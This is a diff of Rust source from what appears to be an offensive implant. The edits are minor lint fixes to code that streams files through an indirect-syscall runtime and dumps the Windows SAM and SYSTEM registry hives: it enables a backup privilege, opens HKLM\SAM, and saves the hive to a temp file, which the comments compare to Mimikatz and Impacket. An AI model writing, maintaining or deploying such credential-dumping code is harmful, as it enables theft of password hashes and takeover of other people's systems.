@@ -34,6 +34,7 @@ use core::ffi::c_void;
 use nyx_protocol::Response;
 
 /// Per-chunk size for streamed hive reads. Matches fs.rs CHUNK.
+#[allow(dead_code)]
 const CHUNK: usize = 128 * 1024;
 
 /// Read a whole file via the indirect-syscall runtime as a streamed list of
@@ -63,7 +64,7 @@ unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Re
             crate::fs::FILE_SHARE_READ,
         )
     };
-    let mut note_prefix: Option<String> = None;
+    let note_prefix: Option<String> = None;
     match probe {
         Ok(handle) => {
             // File is readable — close the probe and do the real streaming read
@@ -582,7 +583,7 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
 /// the in-memory hive copy (the same path Mimikatz/Impacket use). Returns the
 /// temp-file path on success. `chunk_name` selects the root: "SAM" or "SYSTEM".
 unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
-    use crate::heap::{vec, String, Vec};
+    use crate::heap::{String, Vec};
     use crate::resolve::export_addr;
     use core::ffi::c_void;
 
@@ -652,14 +653,14 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
     let _ = unsafe { enable_privilege(&backup_wide) };
 
     // Open HKLM\<SAM|SYSTEM>.
-    let HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
+    let hkey_local_machine: *mut c_void = 0x8000_0002usize as *mut c_void;
     let sub = match reg_root_wide(chunk_name) {
         Some(s) => s,
         None => return Err(-1),
     };
     let mut hkey: *mut c_void = core::ptr::null_mut();
     // KEY_READ = 0x20019 (READ_CONTROL | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_NOTIFY)
-    let open_rc = unsafe { open(HKEY_LOCAL_MACHINE, sub.as_ptr(), 0, 0x20019, &mut hkey) };
+    let open_rc = unsafe { open(hkey_local_machine, sub.as_ptr(), 0, 0x20019, &mut hkey) };
     if open_rc != 0 {
         // Surface the RegOpenKeyExW error code for diagnosis.
         return Err(open_rc);
@@ -736,6 +737,7 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
 }
 
 /// Resolve %TEMP% (UTF-16 → ASCII). Falls back to None on failure.
+#[allow(dead_code)]
 fn temp_dir() -> Option<String> {
     type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
     let gev: GetEnvVarW = unsafe {
